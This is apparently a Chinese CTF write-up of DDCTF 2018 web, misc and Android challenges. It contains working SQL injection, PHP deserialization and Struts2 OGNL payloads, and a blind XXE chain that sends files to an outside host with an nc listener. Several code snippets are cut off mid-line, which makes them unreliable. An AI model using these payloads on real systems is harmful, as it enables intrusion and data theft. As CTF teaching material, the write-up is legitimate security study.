尝试访问，http://116.85.48.102:5050/flag/testflag/yourflag发现报错500，好像是数组越界？ 此时尝试将yourflag替换为DDCTF{1321}，返回failed!!!。 猜测爆破flag么？完全没戏啊。看样子应该有其他地方可以入手。 然而又发现了主页js的一句神奇的话。一个ajax语句。 然并卵，404。。。。。 此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个icon。 http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= 访问后，发现下载了favicon.ico 此时发现图标好像图片很奇怪。后来果然验证了这是个hint。 此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。 美滋滋。此时也知道了题目中hint的用意。题目采用springmvc+mybatis编写 百度搜索springmvc+mybatis文件结构，美滋滋读文件。 首先，大概知道了资源文件都是在WEB-INF文件夹下，所以猜测这个icon也在这里，此时我们要先确定文件夹。 WEB-INF下有一个web.xml，此时尝试读取，最终确定目录../../WEB-INF/web.xml。 然后拖文件。这里说几点注意事项。 通过../../WEB-INF/web.xml确认位置。 继续根据web.xml中的内容进行文件读取。classpath是WEB-INF/classes 读class文件时根据包名判断文件目录com.didichuxing.ctf.listener.InitListener 即为WEB-INF/com/didichuxing/ctf/listener/InitListener.class 制造网站报错，进一步找到更多的文件 差不多，注意一上四点，就可以拿到尽量多的源码了。 拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。 （此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向） 此时开始苦逼的分析源码。 分析后发现，存在接口，用当前用户的邮箱去生成一个flag。 但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的 此时又一次明白了，为什么读文件允许ks文件。 来吧，首先先拿邮箱申请一个flag 然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。 public static String byte2hex(byte[] b) { StringBuilder hs = new StringBuilder(); for (int n = 0; (b != null) && (n 坑：但是此时后端仅允许post方式。且参数是以get传递的。 成功获取到flag Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE 然后，解密吧。。 只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过） 最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。 https://blog.csdn.net/zbuger/article/details/51690900 然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。） (╯°□°）╯︵ ┻━┻ 要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。 通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。 DDCTF{1797193649441981961} 注入的奥妙 题目： 本题flag不需要包含DDCTF{}，为[0-9a-f]+ http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1 解答： 按照题目要求，这题应该是个注入题，毫无疑问。 查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。 1餐' and 1=1%23 orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时双写绕过即可。 此时查询数据库： 1餐' uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23 然后继续查询表名： 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23 此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。 此时祭出hex大法。数据库会直接将0x开头的进行转码解析。 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23 此时成功的爆出来了三个表 message,route_rules,users 然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。 查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。 通过路由信息，我们可以发现存在static/bootstrap/css/backup.css源码泄露。 通过以下三行脚本即可保存该文件。 import requests f=open('a.zip','wb') f.write(requests.get('http://116.85.48.105:5033/static/bootstrap/css/backup.css').content) 接下来就是对PHP代码的审计。 首先，分析路由。我们从数据表内知道了有以下几条规则 get/:u/well/getmessage/:s Well#getmessage get/:u/justtry/self/:s JustTry#self post*/:u/justtry/try JustTry#try 首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。 第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。 此时看见了 unserialize ，倍感亲切，这不就是反序列化么。 此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。 test类，顾名思义，就是一个测试用的。 此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。 仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。 所以，这个反序列化是个相当大的工程。自己手写是无望了。 首先尝试了一下，自己写三个类的调用。。。然而失败了。 最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。） 发现，他是有一个命名空间的要求。序列化后语句如下 O:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4eaee5db-2304-4d6d-aa9c-962051d99a41\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}} 最终的Payload如下： url:http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/ postdata: serialize=%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d mini blockchain 题目 ： 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？ 注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求 题目入口： http://116.85.48.107:5000/b942f830cf97e 解答 ： 拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。 第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！ 时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目 首先，题目给了源码，这个很棒棒。 建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。 在这里不做太多的理解源码的讲解。 最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂） 然后慢慢的开始了解区块链，最后发现这种手段。 这道题目中，利用了区块链一个很神奇的东西。 因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。 如下图，就是此时该题目的区块链。 那么我们可以再构造一条链，只要比主链长，那这条链就是我们说了算。 此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。 但是，说的轻巧，我们该如何构造呢？ 首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。 只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。 然而DDcoin是什么呢。 在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。 nonce:自定义字符串 prev：上一个区块的地址 hash：这个区块的hash height：当前处于第几个节点 transactions：交易信息 再分析transactions input与signature好像是一个凭证，验证这个区块主人身份。 output，收款人信息 amount，收款数额 addr，收款地址 hash这里的话，不是太明白。 但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。 create_output_utxo(addr_to, amount) // 新建一个output信息 create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息 create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块 首先新建output，此时参数很简单，收货人地址（商店），数量（全款） 然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash 此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。 也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx 然后此时tx也有了，进行下一步create_block 此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx 此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头， 这样，我们才能添加。 然后向那个添加块的地址post由create_block即可成功添加第一个块。 记得改请求头中的content-type为json。还有就是cookie自己手动更新 第二个块的时候，问题又来了。 这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？ 此时可以注意到题目中init中给的hint。 凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！ 于是。。。。。通过这个方式，在后面添加几个空区块就好。 成功伪造主链！获取一颗砖石。 再次重复以上做法，完成第三条链即可获取到flag 切记，手动更新cookie…… 我的博客 题目 ： 提示：www.tar.gz http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d 解答 ： 题目又给了源码，美滋滋。 然而下载到源码后就不美滋滋了。 一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。 然而，你是进不去主页的。因为。。 还没进去，就被die了。 然后只好分析如何能成为admin了。此时看到了。 当你是通过邀请码注册的，你便可以成为admin。 然而，邀请码是完全随机的。 此时，想起LCTF的一道题，感觉完全一样有木有！ https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F 然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。 此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？ 然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。 奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。 最后还是决定看一下随机数这里。很开心，找到了这篇文章。 http://drops.xmd5.com/static/drops/web-11861.html 然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？ 满满的都是嘲讽…. 来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。 然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！ 首先，大家需要先知道rand()是不安全的随机数。（然而我不知道） 然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？ 然而作者没告诉，给的链接都是数学，看不懂….. 此时PHITHON大佬的这篇文章真的是解救了自己。 https://www.leavesongs.com/penetration/safeboxs-secret.html 所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。 如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。 此时，我们先获取他100个随机数。 s = requests.Session() url='http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php' headers={'Connection': 'Keep-Alive'} state=[] for i in range(50): r=s.get(url,headers=headers) state.append(int(re.search(r'id=\"csrf\" value=\"(.+?)\" required>', r.text, re.M|re.I).group(1))) 然后测试一下 yuce_list=[] for i in range(10): yuceTemp=yuce(len(state)) state.append(yuceTemp) yuce_list.append(yuceTemp) 此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2147483647才是真正的数。 但此时又有了一个问题。 之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是…. 此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。 接下来需要写如何打乱字符串。 可以发现，一个很简单的流程，生成随机数，然后交换位置。 唯一不知道的地方就是其中这个地方的一个函数。 此时直接去GitHub翻一下源码。 https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h 然后就是愉快的重写代码。 def rand_range(rand,minN,maxN,tmax=2147483647): temp1=tmax+1.0 temp2=rand/temp1 temp3=maxN-minN temp4=temp3+1.0 temp5=temp4*temp2 rand=minN+(int)(temp5) return rand admin_old=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] for i in range(len(admin_old))[::-1]: a=rand_range(int(yuce_list[len(admin_old)-i-1]),0,i) admin_old[i],admin_old[a]=admin_old[a],admin_old[i] key='' for i in admin_old: key+=i print(key) 此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。 def getAdmin(username,passwd,code): data={ \"csrf\":csrf, \"username\":username, \"password\":passwd, \"code\":code } r=s.post(url,headers=headers,data=data) print(r.text) 切记！code是：admin###开头，后面截取32位！ 最后用拿到的账号进行登录即可。 后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤 /a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&title=-1%1$'+union+select+1,f14g,3+from+a8e79480.key+where+1+%23 喝杯Java冷静下 题目： 题目环境：Quick4j 解答： 查看网页源代码，找到登录的用户名和密码（admin: admin_password_2333_caicaikan） Line 87: 登录进去发现跟 Web2 差不多，也是 任意文件下载漏洞。 对比 Github 上 Quick4j 的源代码文件路径，把所有代码文件对应的下载下来，与原来的代码进行比较。 找到关键文件，进行反编译： /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class if ((username.equals(\"superadmin_hahaha_2333\")) && (password.hashCode() == 0)) { String wonderful = \"you are wonderful,boy~\"; System.err.println(wonderful); } 找到超级管理员用户名和密码（superadmin_hahaha_2333: f5a5a608） /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class @RequestMapping(value={\"/nicaicaikan_url_23333_secret\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"super_admin\"}) 这里以超级管理员身份，可以实现 XML 外部实体注入 漏洞。 但是这里的注入没有回显，那只能用反弹实现回显了。 服务器部署 1.xml： \"> 服务器监听端口：nc -l -p 23946 Payload 示例： %dtd; %all; ]> &send; 读取 /Flag/hint.txt 文件： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22file%3a%2f%2f%2fflag%2fhint.txt%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag in intranet tomcat_2 server 8080 port. 访问 http://tomcat_2:8080/ ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2f%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e try to visit hello.action. 访问 http://tomcat_2:8080/hello.action ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e This is Struts2 Demo APP, try to read /flag/flag.txt. 根据题目提示：第二层关卡应用版本号为 2.3.1 上网查了一下 Struts2 2.3.1 的 CVE ，发现 Struts2 S2-016 可用 直接贴上最终 Payload： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%3fredirect%253a%2524%257b%2523a%253dnew%2bjava.io.FileInputStream(%2527%252fflag%252fflag.txt%2527)%252c%2523b%253dnew%2bjava.io.InputStreamReader(%2523a)%252c%2523c%253dnew%2bjava.io.BufferedReader(%2523b)%252c%2523d%253dnew%2bchar%255b60%255d%252c%2523c.read(%2523d)%252c%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527).getWriter()%252c%2523matt.println(%2523d)%252c%2523matt.flush()%252c%2523matt.close()%257d%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag: DDCTF{You_Got_it_WonDe2fUl_Man_ha2333_CQjXiolS2jqUbYIbtrOb} MISC 作者：5am3、impakho 签到题 题目 ： 请点击按钮下载附件 解答 ： 出题人是真的皮。下载后会发现一个神奇的东西。flag.txt里面的内容是这个 请查看赛题上方“公告”页 然后打开公告页，发现了他。。 DDCTF{echo”W3Lc0me_2_DiD1${PAAMAYIM_NEKUDOTAYIM}C7f!”} 好歹咱也是个web手。so ….. 本来还以为要解开里面的PHP代码。自己误以为是这个。 DDCTF{W3Lc0me_2_DiD1::C7f!\"} 最后发现，原来是真·签到题。 (╯°□°）╯︵ ┻━┻ 题目 ： (╯°□°）╯︵ ┻━┻ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd 解答 ： 这道题蛮坑的。。想了无数种密码后都没思路。最后只能老老实实研究，或许是一些简单的编码？ 一共134个字符。尝试2位一组，转化为十进制后，发现数值在一定范围内浮动。 然后考虑到ascii码可见区域，于是尝试对其进行取余128的操作。 最后发现余数均在ascii码的可见区域。之后hex2ascii 即可获取到flag。 a=[212,232,225,244,160,247,225,243,160,230,225,243,244,161,160,212,232,229,160,230,236,225,231,160,233,243,186,160,196,196,195,212,198,251,185,178,178,225,226,185,185,183,180,225,180,183,227,228,179,178,178,227,230,180,179,226,181,176,182,177,176,230,225,229,225,181,253] b='' for i in a: b+=chr(i%128) print(b) DDCTF{922ab9974a47cd322cf43b50610faea5} 第四扩展FS D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。 拿到图片，发现大小出奇的大，于是尝试binwalk，提出来一个压缩包。 尝试打开，发现是有密码的。（这里有个技巧，个人比较喜欢用windows的好压解压缩软件，这个软件存在一定的压缩包修复。） 然后回到题目，仔细分析。尝试无果后，最终将密码锁定在了提示已经在题目里，所以尝试查看文件属性，发现了一些奇怪的字符串。 一般来说，图片信息中不会出现备注的。所以尝试将其作为密码解压，解压成功。 然后发现了一串稀奇古怪的。。。。字符。 此时想到了题目中给的hint：日常违规审计中频次有时候非常重要 尝试词频统计。得到flag 此时有一点小小坑。。D是两个。。 flag ：DDCTF{x1n9shaNgbIci} 流量分析 题目 ： 提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c 提示二：注意补齐私钥格式 —–BEGIN RSA PRIVATE KEY—– XXXXXXX —–END RSA PRIVATE KEY—– 解答 ： 怎么说呢，做完这题，我才知道坑人能有多坑！ 流量分析的题，首先可以发现他的大小很小。不像是那种大流量的分析。 尝试了一下学长之前推荐的一款工具《科来网络分析系统》 可以发现ftp传输了两个包。此时，fl-g极有可能是flag。 于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。 只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。 继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧） wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。 然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。 此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。 经过老司机多年开车经验，呸。做题经验。 猜测！肯定有https流量。当然，科来也说有了。 于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。 尤其是那个图片！图片！图片！！！！ ocr也不行，手写也不行。那么多字。心塞ing。 好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。 然后就是解密https流量。具体可以看这个链接。 https://blog.csdn.net/kelsel/article/details/52758192 直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。 然后就可以解密https流量了。 然后搜索ssl，追踪http流量，最后取得flag 安全通信 感谢impakho师傅！ 题目： #!/usr/bin/env python import sys import json from Crypto.Cipher import AES from Crypto import Random def get_padding(rawstr): remainder = len(rawstr) % 16 if remainder != 0: return '\\x00' * (16 - remainder) return '' def aes_encrypt(key, plaintext): plaintext += get_padding(plaintext) aes = AES.new(key, AES.MODE_ECB) cipher_text = aes.encrypt(plaintext).encode('hex') return cipher_text def generate_hello(key, name, flag): message = \"Connection for mission: {}, your mission's flag is: {}\".format(name, flag) return aes_encrypt(key, message) def get_input(): return raw_input() def print_output(message): print(message) sys.stdout.flush() def handle(): print_output(\"Please enter mission key:\") mission_key = get_input().rstrip() print_output(\"Please enter your Agent ID to secure communications:\") agentid = get_input().rstrip() rnd = Random.new() session_key = rnd.read(16) flag = '' print_output(generate_hello(session_key, agentid, flag)) while True: print_output(\"Please send some messages to be encrypted, 'quit' to exit:\") msg = get_input().rstrip() if msg == 'quit': print_output(\"Bye!\") break enc = aes_encrypt(session_key, msg) print_output(enc) if __name__ == \"__main__\": handle() 解答 ： 从 get_padding 和 aes_encrypt 能够看出这是一个 AES ECB 256位分组加密加密密钥是 16字节 随机生成，ECB明文分组相同，对应的密文分组也相同。 由此可以通过改变 agentid 的长度，使flag中的字符依次落入前面已知的明文分组中，逐字节爆破。 贴出脚本： from pwn import * import string LOG = False flag = '' mission_key = '********************************' agent_id = '' while True: r = remote('116.85.48.103', 5002) r.recvuntil('mission key:') r.sendline(mission_key) r.recvuntil('communications:') agent_id = 'a' * (13+16*8-len(flag)) r.sendline(agent_id) r.recvline() enc = r.recvline().rstrip()[32*11:32*12] if LOG: print 'enc=%s' % enc for i in string.printable[:-5]: r.recvuntil('to exit:') message = 'Connection for mission: %s, your mission\\'s flag is: %s' % (agent_id, flag + i) r.sendline(message[-16:]) r.recvline() enc_tmp = r.recvline().rstrip() if LOG: print 'enc_tmp=%s' % enc_tmp if enc_tmp == enc: flag += i break r.close() if flag[-1:] == '}': break print 'flag=%s' % flag print 'Flag: %s' % flag Flag: DDCTF{87fa2cd38a4259c29ab1af39995be81a} Android 感谢LeadroyaLshi师傅！ LeveL1 Java 层什么都没有，直接看 native；native 里包含了一些数学计算。 有 init_array ，但里面主要是一些线程相关操作的初始化，没有JNI_OnLoad。 int __fastcall Java_com_didictf_guesskey2018one_MainActivity_stringFromJNI(JNIEnv *a1, jobject a2, jstring a3) { i = 0; bInput = (*a1)->GetStringUTFChars(a1, a3, 0); j_j_GetTicks(); do v10 = j_j_gpower(i++); while ( i != 32 ); j_j_GetTicks(); fromBytes((String *)&p_string, bInput); v5 = (String *)fromString((String *)&cp_string, (String *)&p_string); ret = j_j_j__Z20__aeabi_wind_cpp_prjSs((int)v5); finiString((int *)(cp_string - 12)); finiString((int *)(p_string - 12)); return ret; } 上来先算了32次平方，不知道想干嘛，调用2次GetTicks，不知道想干嘛。之后把输入转为std::string类型，进入check` 函数。 首先检测长度是否为36，以及与 const-data 进行 xor。 while ( 1 ) { if ( v13 >= 1 && currentOff 这个地方校验第0~10、第11~20、第21~30、第30~40是否一模一样。 最后的检测是 if ( v24 ) goto LABEL_40; // if a%b == 0 v26 = j_j_j___aeabi_uldivmod(divisor, dividend); v3 = 1; v25 = (unsigned int)dividend >= (unsigned int)v26; LODWORD(v26) = 1; if ( v25 ) LODWORD(v26) = 0; v27 = 1; if ( HIDWORD(dividend) >= HIDWORD(v26) ) v27 = 0; if ( HIDWORD(dividend) != HIDWORD(v26) ) LODWORD(v26) = v27; if ( !(_DWORD)v26 ) LABEL_40: v3 = 0; finiString((int *)v30 - 3); 这里v3最后被返回了，要求是前者能够整除后者，而且会有除数和商的大小比较，只有除数大于上时候才有可能返回1。 dividend = j_j_atoll((const char *)a1->ptr); 往上翻，发现输入仅与除数有关。 被除数是由两个字符串算出来的，怎么算出来的我也看不大懂，好像是重新组合成一个字符串，拼接字符什么样的，应该可以直接 dump。 【后来看某位老哥写的 writeup，发现是通过2个字符串取 index 得到的】 https://blog.csdn.net/dydxdz/article/details/80037937 map1 = {} str1 = 'deknmgqipbjthfasolrc' for i in range(len(str1)): map1[str1[i]] = i/2 str2 = 'jlocpnmbmbhikcjgrla' k = [] for i in range(len(str2)): print map1[str2[i]], 先创建 map ，第 i 个 char对应的数字是i/2 ，刚好得到每个 char 对应 [0,10) 的数字；再查询 str2里每个 char 所对应的下标，将这个下标加上 '0' ，拼起来，得到新的十进制的字符串。 综上，拿到数字 5889412424631952987 ，将它分解了， 5889412424631952987=1499419583*3927794789 ，输入就是偏大的数字， 1499419583 ，再 xor 一下常量就行了。 最后 flag 是 d5axivcw6ggfswpxg80estgc58h7yghqogbm 。 LeveL2 看起来使用的是 Robust 的热更新框架，没有做太特殊的处理，在 assets 里存放了 GeekTan.BMP ，其实是个 zip 包，里面放着 Robust 的 patch 文件。 有简单的方法，也有复杂的方法，复杂的就是肉眼去看，把代码运行一遍即可，是个约瑟夫问题，也可以直接求解，跟我以前出的用栈写约瑟夫很像。 简单的方法嘛，直接上 xposed input text DDCTF{2517299225169920} XposedHelpers.findAndHookMethod(\"cn.chaitin.geektan.crackme.MainActivity\", loader, \"Joseph\", int.class, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); new Exception().printStackTrace(); Log.d(TAG, \"======== before hook =======\"); Log.d(TAG, \"with \" + (int) param.args[0] + \" and\" + (int) param.args[1]); } @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable { super.afterHookedMethod(param); Log.d(TAG, \"======== after hook =======\"); Log.d(TAG, \"result is \" + param.getResult()); } }); LeveL3 Java 层什么都没有，直接看 native。 init_array应该是初始化一些东西，没有过多操作。 没有JNI_OnLoad。 直接看 JNI的方法，进入之后先将输入转化为 std::string ，再使用 str2ll转为int64。 长得比较丑，看起来是做divmod(int64, int64)，循环终止的条件是i==int64(input)，最后检测余数是否和预期相等。 debug 一下，大概就是左移1bit，mod 一下，左移1bit，mod 一下这样，写段 python 爆破即可。 DDCTF{ddctf-android2-KEY} p = 0x17A904F1B91290 mod = 0xDBDEE7AE5A90 In [23]: i = 1 ...: remain = 1 ...: while True: ...: remain = ((remain > 32), hex(remain & 0xFFFFFFFF) ...: break ...: i += 1 ...: 595887 241750416186000 0xdbdeL 0xe7ae5a90L 不知道这题想干嘛。。。 LeveL4 这次只有 java 层，没有 native 层，看起来使用了公开的第三方库 spongycastle，所以丢到网站上 deguard 一下，得到一个非常优美的结果~ 官方说是10位以内的数字，所以是暗示爆破，而且 ECC 么，除了爆破也没有办法。 public MainActivity() { super(); this.editText = \"00C3632B69D3FC1DD8D80C288C44281B67F4828DC77E37EE338E830E66DC71972A008835BA3156353815DFEDEB4330B48B454F35A88D83DA6260C206E4A619753F97\"; } public void onClickTest(View arg24) { this.outputView.setText(\"Empty Input\"); TextView v1 = this.preview; this = this; String v4 = v1.getText().toString(); String v5 = v4; if(v4.length() == 0) { v5 = \"1\"; } new R$id().init(); ECPoint v11 = SECNamedCurves.getByName(\"secp256k1\").getG().multiply(new BigInteger(v5.getBytes())); BigInteger v8 = v11.getXCoord().toBigInteger(); BigInteger v13 = v11.getYCoord().toBigInteger(); byte[] v14 = v8.toByteArray(); byte[] v15 = v13.toByteArray(); byte[] v9 = new byte[v14.length + v15.length]; int v6; for(v6 = 0; v6 使用的是 ECC 加密算法，使用secp256k1曲线，先拿到 G 点，与输入进行椭圆域上的相乘，得到新的点，去校验计算出来的点是否是预先规定好的那个点，是的话就 return true 。 这个没什么操作，就是按照描述去爆破，一开始懒得写 